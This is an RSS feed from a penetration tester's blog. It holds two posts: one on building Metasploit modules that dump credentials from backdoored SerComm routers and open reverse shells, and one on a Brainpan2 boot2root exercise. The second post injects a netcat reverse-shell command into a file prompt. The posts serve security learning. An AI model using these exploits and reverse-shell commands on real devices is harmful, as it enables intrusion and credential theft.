@@ -1,0 +1,1560 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Security on Matt Andreko</title>
+    <link>https://www.mattandreko.com/categories/security/index.xml</link>
+    <description>Recent content in Security on Matt Andreko</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-US</language>
+    <atom:link href="https://www.mattandreko.com/categories/security/index.xml" rel="self" type="application/rss+xml" />
+    
+    <item>
+      <title>Backdoor Modules for Netgear, Linksys, and Other Routers</title>
+      <link>https://www.mattandreko.com/blog/2014-01-13-backdoor-modules-for-netgear-linksys-and-other-routers/</link>
+      <pubDate>Mon, 13 Jan 2014 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2014-01-13-backdoor-modules-for-netgear-linksys-and-other-routers/</guid>
+      <description>
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/backdoor_all_the_routers.jpg#left&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;A week or so ago, I read the news of a new backdoor on several devices, including those made by &lt;a href=&#34;http://www.belkin.com/&#34;&gt;Belkin&lt;/a&gt;, &lt;a href=&#34;http://www.cisco.com/&#34;&gt;Cisco&lt;/a&gt;, &lt;a href=&#34;http://www.netgear.com&#34;&gt;NetGear&lt;/a&gt;, &lt;a href=&#34;http://www.linksys.com&#34;&gt;Linksys&lt;/a&gt;, and several others. A list of what seems to be affected devices can be found &lt;a href=&#34;http://wikidevi.com/w/index.php?title=Special%3AAsk&amp;amp;q=%5B%5BManuf%3A%3ASerComm%5D%5D+%5B%5BGlobal+type%3A%3A~embedded*%5D%5D&amp;amp;po=%3FFCC+ID%0D%0A%3FFCC+approval+date%3DFCC+date%0D%0A%3FEstimated+date+of+release%3DEst.+release+date%0D%0A%3FEmbedded+system+type%0D%0A%3FCPU1+brand%0D%0A%3FCPU1+model%3DCPU1+mdl.%0D%0A&amp;amp;eq=yes&amp;amp;p%5Bformat%5D=broadtable&amp;amp;sort_num=&amp;amp;order_num=ASC&amp;amp;p%5Blimit%5D=500&amp;amp;p%5Boffset%5D=&amp;amp;p%5Blink%5D=all&amp;amp;p%5Bsort%5D=&amp;amp;p%5Bheaders%5D=show&amp;amp;p%5Bmainlabel%5D=&amp;amp;p%5Bintro%5D=&amp;amp;p%5Boutro%5D=&amp;amp;p%5Bsearchlabel%5D=%25E&#34;&gt;here&lt;/a&gt;. &lt;a href=&#34;https://twitter.com/elvanderb&#34;&gt;Eloi Vanderbeken&lt;/a&gt;, who posted his findings on &lt;a href=&#34;https://github.com/elvanderb/TCP-32764&#34;&gt;GitHub&lt;/a&gt; made the original discovery. He also wrote a useful python proof-of-concept exploit, which allowed command injection, but I wanted &lt;a href=&#34;http://www.metasploit.com&#34;&gt;Metasploit&lt;/a&gt; integration.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;p&gt;After playing with the proof-of-concept, I realized how powerful this backdoor could be. As I&amp;rsquo;m doing penetration tests for large enterprises, I&amp;rsquo;m still amazed that I find small consumer-grade routers all the time. With this backdoor, however, I could gain leverage into certain networks, gain credentials, or all kinds of other fun. That&amp;rsquo;s where all my learning started.&lt;/p&gt;
+
+&lt;div style=&#34;clear:both;&#34;&gt;&lt;/div&gt;
+
+&lt;h2 id=&#34;configuration-dump-module&#34;&gt;Configuration Dump Module&lt;/h2&gt;
+
+&lt;p&gt;So the first module I wrote, with the help of &lt;a href=&#34;https://twitter.com/_juan_vazquez_&#34;&gt;juan-&lt;/a&gt;, was to dump the configuration of the device&amp;rsquo;s nvram. This is useful to an attacker for a couple reasons:&lt;/p&gt;
+
+&lt;ol&gt;
+&lt;li&gt;It contains clear-text passwords to the device, which can often be used to login to the remote management console.&lt;/li&gt;
+&lt;li&gt;In case the device gets messed up from attacking it, all the configuration values can be restored at a later time from the dump.&lt;/li&gt;
+&lt;li&gt;It contains passwords, sweet passwords! People re-use their passwords everywhere, and you now have valid passwords.&lt;/li&gt;
+&lt;li&gt;Did I mention the passwords?&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Below is a demonstration of the module running. Note the wireless SSID, keys, and additional credentials being uncovered, without having to supply any credentials:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~  msfcli auxiliary/admin/misc/sercomm_dump_config RHOST=192.168.1.1 E
+[*] Initializing modules...
+RHOST =&amp;gt; 192.168.1.1
+[*] 192.168.1.1:32764 - Attempting to connect and check endianess...
+[+] 192.168.1.1:32764 - Big Endian device found...
+[*] 192.168.1.1:32764 - Attempting to connect and dump configuration...
+[*] 192.168.1.1:32764 - Router configuration dump stored in: /Users/mandreko/.msf4/loot/20140113231717_default_192.168.1.1_router.config_104290.txt
+[*] 192.168.1.1:32764 - Wifi SSID: Netgear15
+[*] 192.168.1.1:32764 - Wifi Key 1: 2A17B75F3D
+[*] 192.168.1.1:32764 - Wifi Key 2: C65EFCF158
+[*] 192.168.1.1:32764 - Wifi Key 3: 3066C6DDE6
+[*] 192.168.1.1:32764 - Wifi Key 4: 1F397B65CA
+[*] 192.168.1.1:32764 - HTTP Web Management: User: admin Pass: password
+[*] 192.168.1.1:32764 - PPPoE: User: mandreko_dsl Pass: isreallysecure1
+[*] 192.168.1.1:32764 - PPPoA: User: mandreko_dsl Pass: isreallysecure1
+[*] Auxiliary module execution completed
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Just tonight, I found that in some of the refactoring we did, the credential collection actually broke, so I made a &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/2878&#34;&gt;pull-request&lt;/a&gt; to fix it (in case anyone wants to try it before it&amp;rsquo;s merged to trunk). The above output was using the newer code.&lt;/p&gt;
+
+&lt;h2 id=&#34;the-scanner-module&#34;&gt;The Scanner Module&lt;/h2&gt;
+
+&lt;p&gt;So we can dump the nvram configuration of a device. But what good is that if you&amp;rsquo;re unable to find vulnerable devices on the network? In came module number two, the scanner, which could scan all sorts of network ranges. In the below sample, I scanned my test network for the vulnerability, and it found my device, and detected the endianness it was communicating over. You see, MIPS, unlike x86, which is always little endian, can be big or little endian, depending on the processor. Some can even be both, I&amp;rsquo;m told. However, you need to know which, to know how to communicate with the device. You can start to see how learning MIPS was going to be fun.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~  msfcli auxiliary/scanner/misc/sercomm_backdoor_scanner RHOSTS=192.168.1.0/24 THREADS=64 E
+[*] Initializing modules...
+RHOSTS =&amp;gt; 192.168.1.0/24
+THREADS =&amp;gt; 64
+[+] 192.168.1.1:32764 - Possible backdoor detected - Big Endian
+[*] Scanned 036 of 256 hosts (014% complete)
+[*] Scanned 058 of 256 hosts (022% complete)
+[*] Scanned 083 of 256 hosts (032% complete)
+[*] Scanned 105 of 256 hosts (041% complete)
+[*] Scanned 129 of 256 hosts (050% complete)
+[*] Scanned 157 of 256 hosts (061% complete)
+[*] Scanned 196 of 256 hosts (076% complete)
+[*] Scanned 205 of 256 hosts (080% complete)
+[*] Scanned 233 of 256 hosts (091% complete)
+[*] Scanned 256 of 256 hosts (100% complete)
+[*] Auxiliary module execution completed
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;the-journey-to-an-exploit&#34;&gt;The journey to an exploit&lt;/h2&gt;
+
+&lt;p&gt;So the first two modules really didn&amp;rsquo;t take a long time to write. The scanner for example, was all of 30 minutes, since &lt;a href=&#34;http://www.metasploit.com&#34;&gt;Metasploit&lt;/a&gt; has so many nice mix-ins, and libraries already available. The bulk of my last week and a half was spent learning MIPS, and how to generate working payloads. Let me take you on my journey&amp;hellip;&lt;/p&gt;
+
+&lt;p&gt;Initially, I tried using the payloads in Metasploit, since they&amp;rsquo;ve recently added MIPSBE and MIPSLE (big endian and little endian respectively). However, on my testing device, none of the payloads would work. I figured that it would probably be pretty easy to compile for MIPS based devices, since people do ARM all the time with iOS and Android development. Boy was I wrong. I spent 3 days trying to get a working toolchain. I installed the &lt;a href=&#34;http://buildroot.uclibc.org/&#34;&gt;uclibc Buildroot&lt;/a&gt; toolchain, and found that it&amp;rsquo;s documentation was a bit hard to decipher for a newbie like me. I tried using &lt;a href=&#34;http://www.mentor.com/embedded-software/sourcery-tools/sourcery-codebench/editions/lite-edition/&#34;&gt;Sourcery Codebench&lt;/a&gt;, but again was foiled, because I couldn&amp;rsquo;t target the correct MIPS processors. Eventually I was reading about using &lt;a href=&#34;http://www.gentoo.org&#34;&gt;Gentoo&lt;/a&gt; with its &amp;ldquo;crossdev&amp;rdquo; package.&lt;/p&gt;
+
+&lt;p&gt;After a day of compiling, I had a working base image. From there, I installed crossdev per the documentation. Additionally, I had it create cross-compilers for my MIPS target. (This took several hours to figure out how to get right) In case anyone wants it, this worked for me:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;# emerge crossdev
+# CBUILD=x86_64-pc-linux-gnu CHOST=x86_64-pc-linux-gnu CTARGET=mips-pc-linux-uclibc USE=-nptl crossdev --target mips-pc-linux-uclibc --without-headers
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Amazing! I could build executables! I made a simple HelloWorld app, and compiled it. It then ran on my test device. I was in business. I just had to figure out how to make a new template in Metasploit, which was going to be no fun at all.&lt;/p&gt;
+
+&lt;p&gt;I started talking with &lt;a href=&#34;https://twitter.com/_juan_vazquez_&#34;&gt;juan-&lt;/a&gt;, and I mentioned that my exploit module would now upload the binary payload, but would never run, giving all sorts of random errors. However, if I manually ran &amp;lsquo;msfpayload&amp;rsquo;, and uploaded the output, it would work. For some reason I had never tried this, because I do things the hard way sometimes. When we were talking, something I said apparently made him think about it. He came back, and told me he found something. Intrigued, I asked for more information, and he showed me a typo in the core libraries that he then made into a &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/2849/files&#34;&gt;pull-request&lt;/a&gt;. It was a simple mistake, which was probably looked over several times. The  MIPSBE payloads were being encoded with a MIPSLE encoder, which just messed up everything.&lt;/p&gt;
+
+&lt;p&gt;After he merged the pull request, the skies turned blue, and a little rainbow appeared. Payloads were being generated in my module successfully, and giving me shells. Then, I realized that all the time I spent building a &lt;a href=&#34;http://www.gentoo.org&#34;&gt;Gentoo&lt;/a&gt; crossdev environment, and installing all kinds of tools were pretty much wasted, since it was all just due to a single character typo. On the bright side, the time wasn&amp;rsquo;t really wasted, as I did learn a &lt;em&gt;lot&lt;/em&gt; about MIPS, since I was starting to read on shellcoding too.&lt;/p&gt;
+
+&lt;h1 id=&#34;the-smell-of-fresh-shells-in-the-morning&#34;&gt;The smell of fresh shells in the morning&lt;/h1&gt;
+
+&lt;p&gt;So after all that time messing with MIPS and &lt;a href=&#34;http://www.metasploit.com&#34;&gt;Metasploit&lt;/a&gt; ruby code, I had something working, which would actually get a shell. However, as I quickly learned over this past weekend, I forgot to account for little endian devices on the exploit. I had even written code to detect the endianness on the scanner and config dump modules, but somehow on the important command injection vulnerability, had only tested on big endian. I came clean with &lt;a href=&#34;https://twitter.com/_juan_vazquez_&#34;&gt;juan-&lt;/a&gt;, and told him to expect yet another pull request. He was able to make a quick fix, to get the module working for the next Pro release. I then worked to put together a new pull-request to add the little endian values.&lt;/p&gt;
+
+&lt;p&gt;During my testing over several devices, however, I found that sometimes devices that would talk to me using big endian, would sometimes require little endian payloads, and vice versa. It was odd, and I can&amp;rsquo;t explain it, but they did. So I added several new targets to my exploit, for specific devices, as well as 2 generic ones. As I get ahold of additional devices (or anyone else for that matter), the code will be updated to reflect those new values. Those changes will hopefully be merged into the trunk soon, but for now, the code can be accessed &lt;a href=&#34;https://github.com/rapid7/metasploit-framework/pull/2874&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;To demonstrate this bug, I have exploited a NetGear WAP4410N device:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~  msfconsole -r wap4410n.rc
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%     %%%         %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %  %%%%%%%%   %%%%%%%%%%% http://metasploit.pro %%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%  %%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%  %%%%%%%%%   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%%  %%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+%%%%    %%   %%%%%%%%%%%  %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%  %%%%%
+%%%%  %%  %%  %      %%      %%    %%%%%      %    %%%%  %%   %%%%%%       %%
+%%%%  %%  %%  %  %%% %%%%  %%%%  %%  %%%%  %%%%  %% %%  %% %%% %%  %%%  %%%%%
+%%%%  %%%%%%  %%   %%%%%%   %%%%  %%%  %%%%  %%    %%  %%% %%% %%   %%  %%%%%
+%%%%%%%%%%%% %%%%     %%%%%    %%  %%   %    %%  %%%%  %%%%   %%%   %%%     %
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%  %%%%%%% %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%          %%%%%%%%%%%%%%
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+
+       =[ metasploit v4.9.0-dev [core:4.9 api:1.0] ]
++ -- --=[ 1251 exploits - 681 auxiliary - 201 post ]
++ -- --=[ 328 payloads - 32 encoders - 8 nops      ]
++ -- --=[ Answer Q&#39;s about Metasploit and win a WiFi Pineapple Mk5   ]
++ -- --=[ http://bit.ly/msfsurvey (Expires Wed Jan 22 23:59:59 2014) ]
+
+[*] Processing wap4410n.rc for ERB directives.
+resource (wap4410n.rc)&amp;gt; use exploit/linux/misc/sercomm_exec
+resource (wap4410n.rc)&amp;gt; set target 2
+target =&amp;gt; 2
+resource (wap4410n.rc)&amp;gt; set payload linux/mipsbe/shell_reverse_tcp
+payload =&amp;gt; linux/mipsbe/shell_reverse_tcp
+resource (wap4410n.rc)&amp;gt; set rhost 192.168.1.1
+rhost =&amp;gt; 192.168.1.1
+resource (wap4410n.rc)&amp;gt; set lhost 192.168.1.136
+lhost =&amp;gt; 192.168.1.136
+msf exploit(sercomm_exec) &amp;gt; show options
+
+Module options (exploit/linux/misc/sercomm_exec):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   RHOST  192.168.1.1      yes       The target address
+   RPORT  32764            yes       The target port
+
+
+Payload options (linux/mipsbe/shell_reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.136    yes       The listen address
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   2   Cisco WAP4410N
+
+
+msf exploit(sercomm_exec) &amp;gt; show targets
+
+Exploit targets:
+
+   Id  Name
+   --  ----
+   0   Generic Linux MIPS Big Endian
+   1   Generic Linux MIPS Little Endian
+   2   Cisco WAP4410N
+   3   Honeywell WAP-PL2 IP Camera
+   4   Netgear DG834
+   5   Netgear DG834G
+   6   Netgear DG834PN
+   7   Netgear DGN1000
+   8   Netgear DSG835
+   9   Netgear WPNT834
+
+
+msf exploit(sercomm_exec) &amp;gt; exploit
+
+[*] Started reverse handler on 192.168.1.136:4444
+[*] Command shell session 1 opened (192.168.1.136:4444 -&amp;gt; 192.168.1.1:2817) at 2014-01-14 00:33:02 -0500
+[*] Command Stager progress - 100.00% done (1415/1415 bytes)
+
+ls -al /
+drwxrwxrwx    8 0        0               0 var
+drwxr-xr-x    7 0        0              81 usr
+drwxrwxrwx    4 0        0               0 tmp
+drwxr-xr-x    2 0        0             217 sbin
+drwxr-xr-x    2 0        0              36 root
+dr-xr-xr-x   47 0        0               0 proc
+drwxr-xr-x    2 0        0              23 lost+found
+drwxr-xr-x    3 0        0             742 lib
+drwxr-xr-x    6 0        0             352 etc
+drwxr-xr-x    3 0        0             403 dev
+drwxr-xr-x    2 0        0             323 bin
+drwxr-xr-x   13 0        0             119 ..
+drwxr-xr-x   13 0        0             119 .
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;At this point, command injection has been turned into a fully-fledged shell. As &lt;a href=&#34;https://twitter.com/egyp7&#34;&gt;egyp7&lt;/a&gt; says, &amp;ldquo;I love shells&amp;rdquo;.&lt;/p&gt;
+
+&lt;h2 id=&#34;the-scary-part&#34;&gt;The scary part&lt;/h2&gt;
+
+&lt;p&gt;So here you&amp;rsquo;ve seen how you can take a router, and get a shell on it. However the truly scary part is that several of these devices are listening on their WAN interface! That means a remote attacker can exploit your vulnerable router, and start mapping the inside of your network. Some devices support an SSH server, which you could then connect into, and make a dynamic socks proxy, or just forward ports. You already know the username and password to the SSH server, since you dumped all the passwords before, right?&lt;/p&gt;
+
+&lt;p&gt;Another attack could be to simply change the router&amp;rsquo;s DNS servers, so that when clients connect, it serves them with an evil DNS server, making all your sites go to a remote server, which then transparently steals your credentials.&lt;/p&gt;
+
+&lt;p&gt;You can go all tin-foil hat on this, and have some real fun. However, in the long run, I accomplished my goal, and now can compromise many of those devices I see on penetration tests, which really shouldn&amp;rsquo;t belong in the enterprise, and finally have something to back it up with, other than, &amp;ldquo;it says &amp;lsquo;Home&amp;rsquo; on the box&amp;hellip;&amp;rdquo;&lt;/p&gt;
+
+&lt;h2 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;This was a really fun exercise, and taught me a lot about MIPS. This is also now one of my more favorite contributions.&lt;/p&gt;
+
+&lt;p&gt;In the near future, it sounds like there are going to be staged payloads for MIPS, so you don&amp;rsquo;t have to run the big un-staged ones. As more and more vulnerabilities start popping up on these &amp;ldquo;unconventional computers&amp;rdquo;, we&amp;rsquo;ll see more and more framework around exploiting them. I for one am excited.&lt;/p&gt;
+
+&lt;p&gt;Additionally, if you have any access to a vulnerable device, which isn&amp;rsquo;t currently a target in the exploit module, hit me up. I&amp;rsquo;d love to get more devices added, without buying 100 routers.&lt;/p&gt;
+
+&lt;p&gt;Lastly, I&amp;rsquo;d like to personally thank &lt;a href=&#34;https://twitter.com/_juan_vazquez_&#34;&gt;juan-&lt;/a&gt;. Without your help, these code contributions would have been much lower in quality, if existing at all. You rock.&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>Brainpan2</title>
+      <link>https://www.mattandreko.com/blog/2013-11-20-brainpan2/</link>
+      <pubDate>Wed, 20 Nov 2013 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.mattandreko.com/blog/2013-11-20-brainpan2/</guid>
+      <description>
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/brainpan.jpg#left&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;Over on #vulnhub, there has been quite a chatter about &lt;a href=&#34;http://vulnhub.com/entry/brainpan_2,56/&#34;&gt;Brainpan2&lt;/a&gt;, a &amp;ldquo;sequel&amp;rdquo; to Brainpan, by &lt;a href=&#34;https://twitter.com/@superkojiman&#34;&gt;superkojiman&lt;/a&gt;. They&amp;rsquo;re even offering a 50 GBP award to whoever submits the best write-up! Since I enjoy challenges like this, I took a look at the machine. However, the writeup had to wait until the contest was complete, so that people didn&amp;rsquo;t cheat to win.&lt;/p&gt;
+
+&lt;!-- more --&gt;
+
+&lt;div style=&#34;clear:both;&#34;&gt;&lt;/div&gt;
+
+&lt;h2 id=&#34;the-trolling-it-begins-early&#34;&gt;The trolling, it begins early&amp;hellip;&lt;/h2&gt;
+
+&lt;p&gt;I imported the VM into VMWare Fusion, and started finding the host.&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/brainpan2_vmware_booted.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;The first thing I had to do, was find it&amp;rsquo;s IP. Many people use &amp;lsquo;netdiscover&amp;rsquo;, but I typically prefer just ping sweeping often. It can sometimes miss, but it works well for me.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~  nmap -sP 192.168.188.0/24
+
+Starting Nmap 6.40 ( http://nmap.org ) at 2013-11-20 16:19 EST
+Nmap scan report for 192.168.188.1
+Host is up (0.00046s latency).
+Nmap scan report for 192.168.188.146
+Host is up (0.00061s latency).
+Nmap done: 256 IP addresses (2 hosts up) scanned in 3.14 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;From this, I now know the IP is 192.168.188.146 on my network, but will vary for each person playing this game.&lt;/p&gt;
+
+&lt;p&gt;Next, I did a basic nmap scan to discover what services were on the machine.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~  nmap -sV 192.168.188.146
+
+Starting Nmap 6.40 ( http://nmap.org ) at 2013-11-20 16:20 EST
+Nmap scan report for 192.168.188.146
+Host is up (0.0017s latency).
+Not shown: 998 closed ports
+PORT      STATE SERVICE VERSION
+9999/tcp  open  abyss?
+10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)
+
+Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 37.38 seconds
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;This looked eerily similar to the original Brainpan vulnerable machine. Due to that, I started to attack it in a similar method. I ran &amp;lsquo;dirb&amp;rsquo; on the web server to see if there were any hidden files.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  dirb  ./dirb http://192.168.188.146:10000 wordlists/big.txt -S
+
+-----------------
+DIRB v2.03
+By The Dark Raver
+-----------------
+
+START_TIME: Wed Nov 20 16:22:36 2013
+URL_BASE: http://192.168.188.146:10000/
+WORDLIST_FILES: wordlists/big.txt
+OPTION: Silent Mode
+
+-----------------
+
+GENERATED WORDS: 4217
+
+---- Scanning URL: http://192.168.188.146:10000/ ----
++ http://192.168.188.146:10000//
+    (FOUND: 200 [Ok] - Size: 204)
++ http://192.168.188.146:10000/bin
+    (FOUND: 301 [Moved Permanently] - Size: 0)
+
+-----------------
+DOWNLOADED: 4217 - FOUND: 2
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Again, just like the previous challenge, there was a &amp;lsquo;bin&amp;rsquo; folder. I browsed to it, and saw a &amp;lsquo;brainpan.exe&amp;rsquo;. I had to double-check that I had downloaded the proper boot2root again!&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/brainpan2_firefox_bin_directory.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;p&gt;I downloaded the file, and looked to see if it was still a Portable Executable, only to discover it was actually a JPEG.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~  wget http://192.168.188.146:10000/bin/brainpan.exe
+--2013-11-20 16:25:15--  http://192.168.188.146:10000/bin/brainpan.exe
+Connecting to 192.168.188.146:10000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 18764 (18K) [application/x-msdos-program]
+Saving to: ‘brainpan.exe’
+
+100%[======================================&amp;gt;] 18,764      --.-K/s   in 0.001s
+
+2013-11-20 16:25:15 (16.7 MB/s) - ‘brainpan.exe’ saved [18764/18764]
+
+➜  ~  file brainpan.exe
+brainpan.exe: JPEG image data, JFIF standard 1.01, comment: &amp;quot;CREATOR: gd-jpeg v1.0 (using IJ&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I renamed the file to have a JPEG extension, and opened it, only to see that I&amp;rsquo;d been trolled. I can sense a theme for this challenge&amp;hellip;&lt;/p&gt;
+
+
+&lt;figure class=&#34;img-responsive&#34;&gt;
+    
+        &lt;img src=&#34;https://www.mattandreko.com/img/brainpan2_preview.png&#34; /&gt;
+    
+    
+&lt;/figure&gt;
+
+
+&lt;h2 id=&#34;getting-down-to-business&#34;&gt;Getting down to business&lt;/h2&gt;
+
+&lt;p&gt;Since the webserver seemed to be a dead end, I connected to the server on port 9999. It looked to be a terminal application that I could play with. I logged in as GUEST, and looked around to see the commands it would allow.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~  nc 192.168.188.146 9999
+_|                            _|
+_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|
+_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
+_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
+                                            _|
+                                            _|
+
+[______________________ WELCOME TO BRAINPAN 2.0________________________]
+                             LOGIN AS GUEST
+
+                          &amp;gt;&amp;gt; GUEST
+                          ACCESS GRANTED
+
+
+                             *  *  *  *
+    THIS APPLICATION IS WORK IN PROGRESS. GUEST ACCESS IS RESTRICTED.
+    TYPE &amp;quot;TELL ME MORE&amp;quot; FOR A LIST OF COMMANDS.
+                             *  *  *  *
+
+
+                          &amp;gt;&amp;gt; TELL ME MORE
+    FILES    HELP    VIEW       CREATE
+    USERS    MSG     SYSTEM     BYE
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I found that if I ran the &amp;lsquo;FILES&amp;rsquo; command, it would show me a file listing.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;
+                          &amp;gt;&amp;gt; FILES
+total 36
+-rwxr-xr-x 1 root   root   18424 Nov  4 15:17 brainpan.exe
+-rw-r--r-- 1 root   root    1109 Nov  5 09:24 brainpan.txt
+-rw-r--r-- 1 root   root     683 Nov  4 12:14 notes.txt
+-rw-r--r-- 1 anansi anansi    12 Nov  5 09:16 test-1
+-rwxrwxrwx 1 anansi anansi    19 Nov  5 09:16 test-2
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;If I then used the &amp;lsquo;VIEW&amp;rsquo; command, I could read those files.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;-rwxrwxrwx 1 anansi anansi    19 Nov  5 09:16 test-2
+                          &amp;gt;&amp;gt; VIEW
+    ENTER FILE TO DOWNLOAD: test-2
+File create works.
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;After tinkering, I found that the &amp;lsquo;VIEW&amp;rsquo; command, would let me inject code, if I just prepended my commands with a semi-colon. It wasn&amp;rsquo;t sanitizing the input very well.&lt;/p&gt;
+
+&lt;p&gt;I setup a local listener on my MacBook (192.168.1.136).&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;➜  ~  nc -lv 1234
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I then issued the &amp;lsquo;VIEW&amp;rsquo; command, and injected a connect-back command through netcat.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;                          &amp;gt;&amp;gt; VIEW
+    ENTER FILE TO DOWNLOAD: ; /bin/nc.traditional -e /bin/sh 192.168.1.136 1234
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The window just froze, so I went back to my netcat window to verify it was working. I issued the &amp;lsquo;id&amp;rsquo; command to test it. It was in fact working, and showed that I was able to execute commands as &amp;lsquo;anansi&amp;rsquo;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;id
+uid=1000(anansi) gid=1000(anansi) groups=1000(anansi),50(staff)
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;I really wanted to upgrade this shell to a &amp;lsquo;real&amp;rsquo; shell, like over SSH, but the port scan before didn&amp;rsquo;t show SSH running. On a hunch, I ran &amp;lsquo;netstat&amp;rsquo;, and I found the SSH server running on the &amp;lsquo;127.0.1.1&amp;rsquo; host, on port 2222. Checking the /etc/ssh/sshd_config file verified this configuration, albeit a bit odd.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;netstat -antup
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.1.1:2222          0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:9999            0.0.0.0:*               LISTEN      5382/brainpan.exe
+tcp        0      0 0.0.0.0:10000           0.0.0.0:*               LISTEN      -
+tcp        0      0 192.168.188.146:50562   192.168.1.136:1234      ESTABLISHED 5522/sh
+tcp        0      0 192.168.188.146:9999    192.168.188.1:52622     ESTABLISHED 5382/brainpan.exe
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
+udp        0      0 0.0.0.0:7240            0.0.0.0:*                           -
+udp6       0      0 :::59406                :::*                                -
+&lt;/code&gt;&lt;/pre&gt;
+
